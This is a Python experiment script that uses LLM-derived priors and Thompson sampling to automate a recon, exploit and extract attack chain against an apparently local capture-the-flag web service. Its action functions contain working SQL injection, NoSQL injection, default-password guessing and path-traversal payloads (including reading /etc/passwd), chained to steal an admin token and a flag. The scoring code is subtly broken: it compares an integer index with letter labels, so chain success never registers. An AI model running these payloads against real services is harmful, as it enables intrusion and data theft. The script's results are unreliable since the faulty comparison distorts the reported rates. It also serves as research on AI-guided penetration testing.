#!/usr/bin/env python3
"""Real attack chain experiment v2 - uses Python requests, no shell escaping."""
import time, json, os, sys
import numpy as np
import requests

SERVICE_URL = "http://127.0.0.1:8888"
GATEWAY = 'http://172.16.4.201:8000'
N_CHAINS = 15
N_ACTIONS = 6
T_BUDGET = 50
R_RETRIES = 3
LAMBDA = 0.05
LABELS = [chr(65+i) for i in range(N_ACTIONS)]


# ============================================================
# Action functions (Python requests, no shell)
# ============================================================

def recon_action(choice):
    """Recon actions using requests library."""
    try:
        if choice == 'A':
            r = requests.get(f"{SERVICE_URL}/", timeout=5)
            ok = r.status_code == 200 and ('api/login' in r.text.lower() or 'endpoint' in r.text.lower())
            return ok, r.text
        elif choice == 'B':
            r = requests.get(f"{SERVICE_URL}/api/login", timeout=5)
            return r.status_code in [200, 401, 405], r.text
        elif choice == 'C':
            r = requests.post(f"{SERVICE_URL}/api/login", json={"username":"test","password":"test"}, timeout=5)
            return r.status_code in [200, 401], r.text
        elif choice == 'D':
            r = requests.get(f"{SERVICE_URL}/robots.txt", timeout=5)
            return r.status_code == 404, r.text
        elif choice == 'E':
            r = requests.options(f"{SERVICE_URL}/", timeout=5)
            return True, r.text
        elif choice == 'F':
            r = requests.get(f"{SERVICE_URL}/api/flag", timeout=5)
            return r.status_code == 403, r.text
    except:
        return False, ""
    return False, ""


def exploit_action(choice):
    """Exploit actions using requests library."""
    try:
        if choice == 'A':
            # SQLi: admin' OR '1'='1
            r = requests.post(f"{SERVICE_URL}/api/login",
                json={"username": "admin' OR '1'='1", "password": "x"}, timeout=5)
        elif choice == 'B':
            r = requests.post(f"{SERVICE_URL}/api/login",
                json={"username": "admin", "password": "password"}, timeout=5)
        elif choice == 'C':
            r = requests.post(f"{SERVICE_URL}/api/login",
                json={"username": "admin", "password": "admin"}, timeout=5)
        elif choice == 'D':
            r = requests.post(f"{SERVICE_URL}/api/login",
                json={"username": "' UNION SELECT 1,2,3--", "password": "x"}, timeout=5)
        elif choice == 'E':
            r = requests.post(f"{SERVICE_URL}/api/login",
                json={"username": {"$ne": ""}, "password": {"$ne": ""}}, timeout=5)
        elif choice == 'F':
            r = requests.post(f"{SERVICE_URL}/api/login",
                json={"username": "admin", "password": "123456"}, timeout=5)
        else:
            return False, ""
        success = r.status_code == 200 and 'admin-token-secret' in r.text
        return success, r.text
    except:
        return False, ""


def extract_action(choice):
    """Extraction actions using requests library."""
    try:
        if choice == 'A':
            # Complete chain: users + upload + admin panel + flag
            headers = {"Authorization": "Bearer admin-token-secret"}
            r1 = requests.get(f"{SERVICE_URL}/api/users", headers=headers, timeout=5)
            r2 = requests.post(f"{SERVICE_URL}/api/upload",
                headers={"X-Filename": "../../secret_panel"}, data="x", timeout=5)
            r3 = requests.get(f"{SERVICE_URL}/api/admin?secret_panel",
                headers={"Cookie": "admin_session=1"}, timeout=5)
            resp_text = r1.text + r2.text + r3.text
            if 'admin' in resp_text and 'key' in resp_text.lower():
                # Extract API key from admin panel response
                try:
                    key = json.loads(r3.text).get('key', '')
                    r4 = requests.get(f"{SERVICE_URL}/api/flag",
                        headers={"X-API-Key": key}, timeout=5)
                    resp_text += r4.text
                except:
                    pass
            success = 'FLAG{' in resp_text
            return success, resp_text
        elif choice == 'B':
            r = requests.get(f"{SERVICE_URL}/api/flag", timeout=5)
            return 'FLAG{' in r.text, r.text
        elif choice == 'C':
            r = requests.get(f"{SERVICE_URL}/api/admin",
                headers={"Authorization": "Bearer admin-token-secret"}, timeout=5)
            return 'key' in r.text.lower(), r.text
        elif choice == 'D':
            r = requests.post(f"{SERVICE_URL}/api/upload",
                headers={"X-Filename": "../../../etc/passwd"}, data="test", timeout=5)
            return 'admin' in r.text.lower(), r.text
        elif choice == 'E':
            r = requests.get(f"{SERVICE_URL}/api/flag",
                headers={"Authorization": "Bearer admin-token-secret"}, timeout=5)
            return 'FLAG{' in r.text, r.text
        elif choice == 'F':
            # Try spider-like enumeration
            pages = ['/', '/api/login', '/api/users', '/api/flag', '/api/admin']
            results = []
            for p in pages:
                r = requests.get(f"{SERVICE_URL}{p}", timeout=5)
                results.append(r.text)
            combined = ' '.join(results)
            return 'SQL injection' in combined.lower() and 'flag' in combined.lower(), combined
    except:
        return False, ""
    return False, ""


# ============================================================
# Step definitions
# ============================================================
STEP_DEFS = [
    {
        'name': 'recon',
        'desc': ("Target web service found on internal network. Initial reconnaissance needed. "
                 "Goal: discover available API endpoints and identify attack surface."),
        'action_names': [
            "GET / (landing page)", "GET /api/login", "POST /api/login with test creds",
            "GET /robots.txt", "OPTIONS /", "GET /api/flag"
        ],
        'action_func': recon_action,
        'optimal': 'A',
    },
    {
        'name': 'exploit',
        'desc': ("API login endpoint discovered at /api/login. The service hint mentions "
                 "'SQL injection may reveal hidden data'. Goal: gain privileged access."),
        'action_names': [
            "SQLi: admin' OR '1'='1", "Brute force admin:password",
            "Try admin:admin", "SQLi: UNION-based",
            "NoSQL injection attempt", "Try admin:123456"
        ],
        'action_func': exploit_action,
        'optimal': 'A',
    },
    {
        'name': 'extract',
        'desc': ("Admin token obtained from SQL injection. Goal: locate and retrieve the flag."),
        'action_names': [
            "Get users + upload exploit + flag",
            "Try /api/flag directly", "Try /api/admin with token",
            "Upload path traversal", "Try /api/flag with token",
            "Enumerate all endpoints"
        ],
        'action_func': extract_action,
        'optimal': 'A',
    },
]


def get_llm_prior(desc, action_names):
    """Get LLM prior distribution."""
    resp = requests.post(f'{GATEWAY}/v1/prior', json={
        'state_description': desc,
        'available_actions': action_names
    }, timeout=30)
    raw = resp.json()['probabilities']
    prior = {l: max(raw.get(l, 0.01), 0.001) for l in LABELS}
    total = sum(prior.values())
    return {k: v/total for k, v in prior.items()}


def ts_step(prior_dict, optimal_label, step_def, T, R):
    """Thompson Sampling step with real HTTP actions."""
    alpha = {l: 1.0 for l in LABELS}
    beta = {l: 1.0 for l in LABELS}
    samples_used = 0
    action_func = step_def['action_func']

    for retry in range(R):
        for t in range(T):
            samples_used += 1
            thompson = {}
            for l in LABELS:
                thompson[l] = np.random.beta(alpha[l], beta[l]) + LAMBDA * prior_dict.get(l, 1/N_ACTIONS)
            chosen = max(thompson, key=thompson.get)

            success, resp = action_func(chosen)
            if success:
                alpha[chosen] += 1.0
            else:
                beta[chosen] += 1.0
            time.sleep(0.1)

        best = max(LABELS, key=lambda l: alpha[l]/(alpha[l]+beta[l]))
        if best == optimal_label:
            return True, samples_used
        beta[best] += 2.0

    return False, samples_used


def greedy_step(prior_dict, optimal_label, step_def):
    """Greedy step."""
    action_func = step_def['action_func']
    best = max(LABELS, key=lambda l: prior_dict.get(l, 0))
    success, resp = action_func(best)
    return success and best == optimal_label, 1


def run_chain(step_defs, prior_dicts, T, R):
    """Run complete attack chain."""
    for step_def, prior in zip(step_defs, prior_dicts):
        ok, _ = ts_step(prior, LABELS.index(step_def['optimal']), step_def, T, R)
        if not ok:
            return False
        time.sleep(0.2)
    return True


def main():
    sep = '=' * 65
    print(sep)
    print('REAL ATTACK CHAIN EXPERIMENT v2')
    print(f'{N_CHAINS} chains/method, T={T_BUDGET}, R={R_RETRIES}')
    print(sep)

    # Verify service is running
    try:
        r = requests.get(f"{SERVICE_URL}/", timeout=3)
        print(f'Service OK: {r.json()}')
    except Exception as e:
        print(f'ERROR: Service not reachable - {e}')
        sys.exit(1)

    # Quick test: verify optimal actions work
    print('\nVerifying optimal actions...')
    for sd in STEP_DEFS:
        ok, resp = sd['action_func'](sd['optimal'])
        print(f'  {sd["name"]}: {sd["optimal"]} -> {"OK" if ok else "FAIL"}')
    print()

    # Cache LLM priors
    print('LLM Priors:')
    llm_priors = []
    for sd in STEP_DEFS:
        p = get_llm_prior(sd['desc'], sd['action_names'])
        llm_priors.append(p)
        p_opt = p[sd['optimal']]
        rank = sorted(p, key=p.get, reverse=True).index(sd['optimal']) + 1
        print(f'  {sd["name"]}: P(opt)={p_opt:.3f} rank={rank}/{N_ACTIONS} ({sd["action_names"][LABELS.index(sd["optimal"])]})')
        time.sleep(0.2)

    uni_prior = {l: 1.0/N_ACTIONS for l in LABELS}
    uni_priors = [uni_prior] * 3

    # Run experiments
    results = {}
    for method_name, priors in [('LLM-TS', llm_priors), ('Uniform-TS', uni_priors)]:
        print(f'\n{sep}')
        print(f'{method_name}')
        print(sep)

        successes = 0
        for trial in range(N_CHAINS):
            ok = run_chain(STEP_DEFS, priors, T_BUDGET, R_RETRIES)
            if ok:
                successes += 1
            if (trial + 1) % 5 == 0:
                print(f'  Trial {trial+1}/{N_CHAINS}: success={successes/(trial+1):.1%}')
            time.sleep(0.15)

        rate = successes / N_CHAINS
        se = np.sqrt(rate * (1-rate) / max(N_CHAINS, 1))
        results[method_name] = {'rate': float(rate), 'se': float(se), 'successes': successes}
        print(f'  Chain: {rate:.1%} +/- {se:.1%} ({successes}/{N_CHAINS})')

    # Greedy
    print(f'\n{sep}\nLLM-Greedy\n{sep}')
    g_success = 0
    for trial in range(N_CHAINS):
        ok = True
        for sd, prior in zip(STEP_DEFS, llm_priors):
            step_ok, _ = greedy_step(prior, LABELS.index(sd['optimal']), sd)
            if not step_ok:
                ok = False
                break
        if ok:
            g_success += 1
        if (trial + 1) % 5 == 0:
            print(f'  Trial {trial+1}/{N_CHAINS}: success={g_success/(trial+1):.1%}')
    rate = g_success / N_CHAINS
    se = np.sqrt(rate * (1-rate) / max(N_CHAINS, 1))
    results['LLM-Greedy'] = {'rate': float(rate), 'se': float(se), 'successes': g_success}
    print(f'  Chain: {rate:.1%} +/- {se:.1%} ({g_success}/{N_CHAINS})')

    # Summary
    print(f'\n{sep}')
    print('SUMMARY')
    print(sep)
    for name, r in results.items():
        print(f'  {name:15s}: {r["rate"]:.1%} +/- {r["se"]:.1%} ({r["successes"]}/{N_CHAINS})')

    os.makedirs('results', exist_ok=True)
    json.dump(results, open('results/real_attack_chain.json', 'w'), indent=2)
    print(f'\nSaved.')
    print('Done.')


if __name__ == '__main__':
    main()
